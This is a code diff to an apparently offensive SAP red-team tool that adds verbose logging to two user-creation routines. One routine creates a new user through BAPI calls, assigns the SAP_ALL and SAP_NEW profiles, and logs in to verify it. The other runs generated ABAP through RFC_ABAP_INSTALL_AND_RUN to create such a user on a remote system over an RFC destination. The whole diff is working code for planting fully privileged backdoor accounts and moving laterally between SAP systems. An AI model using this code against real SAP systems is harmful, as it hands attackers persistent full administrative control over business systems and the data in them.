@@ -1174,17 +1174,100 @@ def is_sapmap_owned_user(node: SAPNode, username: str,
         return False
 
 
+def _log_bapi_return(sid: str, fm: str, ret) -> tuple:
+    """Verbose walker over a BAPI RETURN table/struct.  Emits one line
+    per row with TYPE/ID/NUMBER/MESSAGE so the operator sees exactly
+    what SAP said — crucial when the "success" verdict hides a table
+    full of warnings that reveal the actual failure mode.  Returns
+    ``(had_error, first_error_message)``.
+    """
+    rows = ret if isinstance(ret, list) else ([ret] if ret else [])
+    had_err = False
+    first_err = ""
+    for i, entry in enumerate(rows):
+        if not isinstance(entry, dict):
+            continue
+        t   = (entry.get("TYPE", "") or "").strip() or "?"
+        rid = (entry.get("ID", "") or "").strip()
+        num = (entry.get("NUMBER", "") or "").strip()
+        msg = (entry.get("MESSAGE", "") or "").strip()
+        # Skip empty rows (unfilled table slots)
+        if not (rid or num or msg):
+            continue
+        prefix = {"S": "[+]", "I": "[i]", "W": "[!]",
+                    "E": "[-]", "A": "[X]"}.get(t, "[?]")
+        print(f"    {prefix} {sid}: {fm} RETURN[{i}] {t} {rid}/{num}: {msg}")
+        if t in ("E", "A") and not had_err:
+            had_err   = True
+            first_err = msg or f"{rid}/{num}"
+    if not rows:
+        print(f"    [i] {sid}: {fm} RETURN was empty (no messages)")
+    return (had_err, first_err)
+
+
 def create_user_via_bapi(node: SAPNode, username: str, password: str,
-                         client: str, creds: Credentials = None) -> dict:
+                         client: str, creds: Credentials = None,
+                         verify_logon: bool = True) -> dict:
     """Create a user with SAP_ALL via BAPI_USER_CREATE1 + BAPI_USER_PROFILES_ASSIGN.
 
-    Returns dict with: success, message, username
+    Verbose from the start — every RETURN table row is printed, pre-
+    and post-conditions are checked (exists-check + verify-logon) so
+    the operator sees exactly what SAP did.  Extra verbosity added
+    for Julian's testing (issue #8) — no gating, always on.
+
+    Returns dict with: success, message, username, verified,
+                        create_ret, assign_ret, pre_existed, elapsed_s
     """
-    result = {"success": False, "message": "", "username": username}
+    import time as _time
+    t_start = _time.time()
+    result = {"success": False, "message": "", "username": username,
+                "verified": False, "pre_existed": False,
+                "elapsed_s": 0.0,
+                "create_ret": [], "assign_ret": []}
+
+    src = "?"
+    if creds is not None:
+        src = f"{creds.username}@{creds.client or '?'} " \
+              f"(inst={creds.instance_nr or '?'}, " \
+              f"verified={bool(getattr(creds, 'verified', False))})"
+
+    print(f"[*] {node.sid}: create_user_via_bapi — START")
+    print(f"    target sid:      {node.sid}")
+    print(f"    target host:     {node.ip or node.hostname or '?'}")
+    print(f"    target client:   {client}")
+    print(f"    new username:    {username}")
+    print(f"    new password:    {'*' * min(len(password or ''), 12)} "
+          f"({len(password or '')} chars)")
+    print(f"    caller creds:    {src}")
+    print(f"    BAPI FM (create): {BAPI_USER_CREATE}")
+    print(f"    BAPI FM (assign): {BAPI_USER_PROFILES_ASSIGN}")
 
     try:
         with _get_connection(node, creds) as conn:
+            print(f"[+] {node.sid}: RFC connection opened "
+                  f"({_time.time() - t_start:.2f}s)")
+
+            # Pre-check: does the user already exist?
+            try:
+                t_pre = _time.time()
+                exists = check_user_exists(node, username, creds)
+                print(f"    [i] {node.sid}: pre-check existence of "
+                      f"{username} → {exists} "
+                      f"({_time.time() - t_pre:.2f}s)")
+                result["pre_existed"] = bool(exists)
+                if exists:
+                    print(f"    [!] {node.sid}: user {username} already "
+                          f"exists — BAPI_USER_CREATE1 will fail with "
+                          f"'user already exists'; expected")
+            except Exception as _pe:
+                print(f"    [i] {node.sid}: pre-check raised (non-fatal): "
+                      f"{type(_pe).__name__}: {str(_pe)[:120]}")
+
             # Step 1: Create the user
+            print(f"[*] {node.sid}: [1/2] calling {BAPI_USER_CREATE} "
+                  f"USERNAME={username} USTYP=S GLTGB=99991231 "
+                  f"FIRSTNAME=SAPMAP LASTNAME=Security")
+            t1 = _time.time()
             create_result = conn.call(
                 BAPI_USER_CREATE,
                 USERNAME=username,
@@ -1199,48 +1282,102 @@ def create_user_via_bapi(node: SAPNode, username: str, password: str,
                     "FUNCTION": "SAPMAP Red Team",
                 },
             )
+            print(f"    [i] {node.sid}: [1/2] {BAPI_USER_CREATE} returned "
+                  f"in {_time.time() - t1:.2f}s")
 
             ret = create_result.get("RETURN", {})
-            if isinstance(ret, list):
-                for entry in ret:
-                    if entry.get("TYPE", "") in ("E", "A"):
-                        result["message"] = entry.get("MESSAGE", "Unknown error")
-                        print(f"[-] {node.sid}: User creation failed: {result['message']}")
-                        return result
-            elif ret.get("TYPE", "") in ("E", "A"):
-                result["message"] = ret.get("MESSAGE", "Unknown error")
-                print(f"[-] {node.sid}: User creation failed: {result['message']}")
+            result["create_ret"] = ret if isinstance(ret, list) else [ret]
+            had_err, err_msg = _log_bapi_return(
+                node.sid, BAPI_USER_CREATE, ret)
+            if had_err:
+                result["message"] = err_msg or "unknown BAPI error"
+                result["elapsed_s"] = round(_time.time() - t_start, 2)
+                print(f"[-] {node.sid}: [1/2] FAILED — {result['message']}")
+                print(f"[*] {node.sid}: create_user_via_bapi — END "
+                      f"(FAIL, {result['elapsed_s']}s)")
                 return result
 
-            print(f"[+] User {username} created in {node.sid} client {client}")
+            print(f"[+] {node.sid}: [1/2] user {username} created in "
+                  f"client {client}")
 
             # Step 2: Assign SAP_ALL profile
+            print(f"[*] {node.sid}: [2/2] calling "
+                  f"{BAPI_USER_PROFILES_ASSIGN} USERNAME={username} "
+                  f"PROFILES=[SAP_ALL, SAP_NEW]")
             try:
+                t2 = _time.time()
                 assign_result = conn.call(
                     BAPI_USER_PROFILES_ASSIGN,
                     USERNAME=username,
                     PROFILES=[{"BAPIPROF": "SAP_ALL"}, {"BAPIPROF": "SAP_NEW"}],
                 )
-                ret = assign_result.get("RETURN", {})
-                if isinstance(ret, list):
-                    for entry in ret:
-                        if entry.get("TYPE", "") in ("E", "A"):
-                            print(f"[!] {node.sid}: SAP_ALL assignment warning: {entry.get('MESSAGE', '')}")
-                elif ret.get("TYPE", "") in ("E", "A"):
-                    print(f"[!] {node.sid}: SAP_ALL assignment warning: {ret.get('MESSAGE', '')}")
+                print(f"    [i] {node.sid}: [2/2] "
+                      f"{BAPI_USER_PROFILES_ASSIGN} returned in "
+                      f"{_time.time() - t2:.2f}s")
+                ret2 = assign_result.get("RETURN", {})
+                result["assign_ret"] = ret2 if isinstance(ret2, list) else [ret2]
+                had_err2, _err2 = _log_bapi_return(
+                    node.sid, BAPI_USER_PROFILES_ASSIGN, ret2)
+                if had_err2:
+                    print(f"[!] {node.sid}: [2/2] SAP_ALL assignment "
+                          f"reported errors — user exists but may lack "
+                          f"SAP_ALL; check RETURN messages above")
                 else:
-                    print(f"[+] {node.sid}: SAP_ALL profile assigned to {username}")
+                    print(f"[+] {node.sid}: [2/2] SAP_ALL profile "
+                          f"assigned to {username}")
             except Exception as e:
-                print(f"[!] {node.sid}: Could not assign SAP_ALL: {format_rfc_exception(e)}")
+                print(f"[!] {node.sid}: [2/2] Could not assign SAP_ALL: "
+                      f"{format_rfc_exception(e)}")
 
             result["success"] = True
             result["message"] = f"User {username} created with SAP_ALL"
 
     except Exception as e:
         result["message"] = format_rfc_exception(e)
+        result["elapsed_s"] = round(_time.time() - t_start, 2)
         logger.error(f"BAPI user creation failed: {format_rfc_exception(e)}")
-        print(f"[-] {node.sid}: User creation error: {format_rfc_exception(e)}")
+        print(f"[-] {node.sid}: create_user_via_bapi — EXCEPTION: "
+              f"{format_rfc_exception(e)}")
+        print(f"[*] {node.sid}: create_user_via_bapi — END "
+              f"(EXCEPTION, {result['elapsed_s']}s)")
+        return result
 
+    # Post-verify — actually log in as the new user to prove the whole
+    # chain worked end-to-end.  This is the same primitive the operator
+    # would run manually, so failures here catch cases like "the BAPI
+    # said OK but the productive password wasn't set" (SAP Note
+    # 1691234 / initial-password quirk).
+    if verify_logon:
+        try:
+            print(f"[*] {node.sid}: post-verify — logon as {username} "
+                  f"@ client {client}")
+            new_creds = Credentials(username=username, password=password,
+                                     client=client,
+                                     instance_nr=(creds.instance_nr
+                                                    if creds else "00"),
+                                     verified=False)
+            t_v = _time.time()
+            ok = test_connection(node, new_creds)
+            print(f"    [i] {node.sid}: post-verify logon → {ok} "
+                  f"({_time.time() - t_v:.2f}s)")
+            result["verified"] = bool(ok)
+            if ok:
+                print(f"[+] {node.sid}: post-verify logon SUCCEEDED — "
+                      f"{username}/****** is live in client {client}")
+            else:
+                print(f"[-] {node.sid}: post-verify logon FAILED — the "
+                      f"BAPI reported success but the credentials don't "
+                      f"actually work; investigate USR02.CODVN, initial-"
+                      f"password status (SU01 → 'password status'), and "
+                      f"the audit log")
+        except Exception as _ve:
+            print(f"    [i] {node.sid}: post-verify raised (non-fatal): "
+                  f"{type(_ve).__name__}: {str(_ve)[:120]}")
+
+    result["elapsed_s"] = round(_time.time() - t_start, 2)
+    print(f"[*] {node.sid}: create_user_via_bapi — END "
+          f"(OK={result['success']}, verified={result['verified']}, "
+          f"{result['elapsed_s']}s)")
     return result
 
 
@@ -1413,49 +1550,95 @@ def create_user_via_destination(node: SAPNode, destination: str,
         "ENDLOOP.",
     ]
 
+    import time as _time
+    t_start = _time.time()
+    src_desc = "?"
+    if creds is not None:
+        src_desc = f"{creds.username}@{creds.client or '?'} " \
+                   f"(inst={creds.instance_nr or '?'})"
+
+    print(f"[*] {node.sid}: create_user_via_destination — START")
+    print(f"    source sid:      {node.sid}")
+    print(f"    source host:     {node.ip or node.hostname or '?'}")
+    print(f"    caller creds:    {src_desc}")
+    print(f"    RFC destination: {d}  "
+          f"(BAPIs execute on remote target via this SM59 entry)")
+    print(f"    new username:    {u}")
+    print(f"    new password:    {'*' * min(len(p or ''), 12)} "
+          f"({len(p or '')} chars)")
+    print(f"    ABAP program:    ZSAPM  ({len(abap_lines)} lines, "
+          f"{sum(len(l) for l in abap_lines)} chars)")
+    print(f"    ABAP report will call:")
+    print(f"      1. BAPI_USER_CREATE1        DESTINATION {d!r}")
+    print(f"      2. BAPI_USER_CHANGE         DESTINATION {d!r}"
+          f"  (sets productive password — clears initial-pwd flag)")
+    print(f"      3. BAPI_USER_PROFILES_ASSIGN DESTINATION {d!r}"
+          f"  (assigns SAP_ALL + SAP_NEW)")
+
     try:
         with _get_connection(node, creds) as conn:
-            print(f"[*] {node.sid}: Running BAPI_USER_CREATE1 via "
-                  f"ABAP_INSTALL_AND_RUN DESTINATION '{d}'...")
+            print(f"[+] {node.sid}: RFC connection opened to source "
+                  f"({_time.time() - t_start:.2f}s)")
+            print(f"[*] {node.sid}: submitting ABAP via "
+                  f"RFC_ABAP_INSTALL_AND_RUN (may fall back to "
+                  f"/SAPDS/RFC_ABAP_INSTALL_RUN if the first is not "
+                  f"granted)")
+            t_run = _time.time()
             run = _run_abap_program(conn, abap_lines, "ZSAPM")
+            print(f"    [i] {node.sid}: ABAP submission returned in "
+                  f"{_time.time() - t_run:.2f}s (fm={run.get('fm_name')!r})")
 
             if not run["success"]:
                 result["message"] = run["error"]
-                print(f"[-] {node.sid}: {run['error']}")
+                print(f"[-] {node.sid}: ABAP run FAILED — {run['error']}")
+                print(f"[*] {node.sid}: create_user_via_destination — "
+                      f"END (ABAP-FAIL, "
+                      f"{round(_time.time() - t_start, 2)}s)")
                 return result
 
-            print(f"[*] {node.sid}: Used FM: {run['fm_name']}")
             output = run["output"]
+            print(f"[*] {node.sid}: FM used: {run['fm_name']} — "
+                  f"{len(output)} WRITE line(s):")
             for line in output:
-                print(f"    ABAP output: {line}")
+                print(f"    ABAP → {line}")
 
             if any("USER_CREATED" in l for l in output):
                 result["success"] = True
                 if any("SAP_ALL_OK" in l for l in output):
                     result["message"] = (f"User {u} created with "
                                          f"SAP_ALL via DESTINATION")
-                    print(f"[+] {node.sid}: User {u} created and SAP_ALL "
-                          f"assigned on remote system via {d}")
+                    print(f"[+] {node.sid}: User {u} created AND "
+                          f"SAP_ALL assigned on remote target via "
+                          f"DESTINATION {d}")
                 else:
                     result["message"] = (f"User {u} created via "
                                          f"DESTINATION (SAP_ALL uncertain)")
-                    print(f"[+] {node.sid}: User {u} created on remote system "
-                          f"via {d} (SAP_ALL uncertain)")
+                    print(f"[+] {node.sid}: User {u} created on remote "
+                          f"target via {d} — SAP_ALL uncertain (no "
+                          f"'SAP_ALL_OK' marker in ABAP output; check "
+                          f"WRITEs above)")
             else:
                 err = [l for l in output if "ERR:" in l]
                 if err:
                     result["message"] = err[0]
-                    print(f"[-] {node.sid}: Remote user creation: {err[0]}")
+                    print(f"[-] {node.sid}: remote user creation "
+                          f"ERROR — {err[0]}")
                 else:
                     result["message"] = (f"Unexpected output: "
                                          f"{output}")
-                    print(f"[-] {node.sid}: Unexpected output: {output}")
+                    print(f"[-] {node.sid}: unexpected ABAP output "
+                          f"(no USER_CREATED marker, no ERR: line): "
+                          f"{output}")
 
     except Exception as e:
         result["message"] = format_rfc_exception(e)
         logger.error(f"Remote user creation via DESTINATION: {format_rfc_exception(e)}")
-        print(f"[-] {node.sid}: Remote user creation error: {format_rfc_exception(e)}")
+        print(f"[-] {node.sid}: create_user_via_destination EXCEPTION: "
+              f"{format_rfc_exception(e)}")
 
+    print(f"[*] {node.sid}: create_user_via_destination — END "
+          f"(OK={result['success']}, "
+          f"{round(_time.time() - t_start, 2)}s)")
     return result
 
 
